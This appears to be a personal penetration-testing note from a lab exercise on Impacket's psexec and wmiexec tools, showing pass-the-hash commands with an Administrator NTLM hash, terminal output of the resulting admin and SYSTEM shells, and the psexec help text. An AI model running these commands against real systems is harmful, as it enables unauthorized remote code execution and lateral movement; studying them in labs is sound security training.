
impacket-psexec user@ip (only for admins)
 
 and the req ports need to be open..

`impacket-psexec DC01$@10.10.232.150`

`impacket-wmiexec -hashes :3f3ef89114fb063e3d7fc23c20f65568 'Administrator'@10.10.165.51` gave admin

`impacket-psexec -hashes :3f3ef89114fb063e3d7fc23c20f65568 'Administrator'@10.10.165.51` gave <font color=red>system!</font>

### Examples

```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ impacket-wmiexec -hashes :3f3ef89114fb063e3d7fc23c20f65568 'Administrator'@10.10.165.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
hololive\administrator
```

```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ impacket-psexec -hashes :3f3ef89114fb063e3d7fc23c20f65568 'Administrator'@10.10.165.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.165.51.....
[*] Found writable share ADMIN$
[*] Uploading file QsKzMJmA.exe
[*] Opening SVCManager on 10.10.165.51.....
[*] Creating service jBxX on 10.10.165.51.....
[*] Starting service jBxX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
oups, nt auth/system, not admin

### Help

```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ impacket-psexec -h
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CODEC]
                 [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]
                 [-dc-ip ip address] [-target-ip ip address] [-port [destination port]]
                 [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) -
                        (default:cmd.exe)

options:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn´t require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target´s output (default "utf-8"). If errors are
                        detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute
                        smbexec.py again with -codec and the corresponding codec

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don´t ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN)
                        specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as
                        target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```
